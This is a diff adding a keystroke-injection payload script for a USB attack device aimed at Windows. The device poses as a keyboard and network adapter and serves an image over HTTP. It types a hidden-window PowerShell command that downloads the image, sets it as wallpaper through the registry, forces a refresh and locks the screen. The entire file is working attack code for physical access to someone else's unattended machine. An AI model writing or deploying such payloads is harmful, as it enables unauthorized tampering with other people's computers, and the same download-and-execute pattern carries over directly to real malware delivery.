@@ -1,0 +1,46 @@
+# Target: Windows
+#
+# STAGE 1: Setup Web Server
+# STAGE 2: Download and Set Wallpaper & Lock Screen
+
+LED SETUP
+DUCKY_LANG de
+ATTACKMODE HID RNDIS_ETHERNET
+
+GET HOST_IP
+GET SWITCH_POSITION
+
+# DEFINE DIRECTORIES
+WALLPAPER=wp.jpg
+PAYLOAD_DIR=/root/udisk/payloads/${SWITCH_POSITION}
+SERVER_LOG=/tmp/server.log
+
+# SERVER LOG
+rm -f ${SERVER_LOG}
+
+# STAGE 1
+LED STAGE1
+
+# START HTTP SERVER
+iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
+gohttp -p 80 -d /tmp/ > ${SERVER_LOG} 2>&1 &
+
+# CHECK FOR WALLPAPER
+if [ ! -f ${PAYLOAD_DIR}/${WALLPAPER} ]; then
+    LED FAIL2
+    exit 1
+fi
+
+cp -R ${PAYLOAD_DIR}/${WALLPAPER} /tmp/${WALLPAPER}
+
+LED ATTACK
+Q GUI r
+Q DELAY 500
+Q STRING "powershell -w h \"\$p=\$home+'\\${WALLPAPER}';iwr http://${HOST_IP}/${WALLPAPER} -O \$p;SP 'HKCU:Control Panel\Desktop' WallPaper \$p;1..59|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}\""
+Q ENTER
+Q DELAY 1000
+Q GUI d
+Q DELAY 500
+Q GUI l
+Q DELAY 500
+LED FINISH
